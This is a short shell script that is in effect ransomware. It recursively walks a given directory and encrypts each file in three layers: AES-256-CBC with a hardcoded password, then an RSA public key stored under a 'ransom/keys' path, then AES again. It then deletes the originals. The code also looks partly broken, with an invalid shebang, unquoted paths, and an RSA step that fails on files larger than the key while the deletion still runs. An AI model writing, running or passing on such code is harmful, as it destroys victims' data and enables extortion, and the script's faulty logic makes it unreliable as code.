#!/sh

aes_password="ricardo"

enc(){
	input="$1"
	if [ $(stat -c %a $input | cut -c 1) = 6 ]; then
		openssl aes-256-cbc -pass pass:$aes_password -in $input -out $input.aes
		openssl rsautl -encrypt -pubin -inkey /home/deauth/ransom/keys/public.pem -in $input.aes -out $input.rsa
		openssl aes-256-cbc -pass pass:$aes_password -in $input.rsa -out $input.enc
		rm $input.aes
		rm $input.rsa
		rm $input
	fi
}

loop(){
for f in $1/*; do
	if [ -d $f ]; then
		echo "$f is a dir"
		loop $f
	else
		#echo "$f is not a dir"
		echo "\n\nFile: $f\n"
	        enc $f
	        echo "\n\n"
	        echo "------------------------"
	fi
done
}

if test "$#" -ne 1; then
	echo "Usage: \n - sh enc.sh $dirname"
	exit 0
fi

loop $1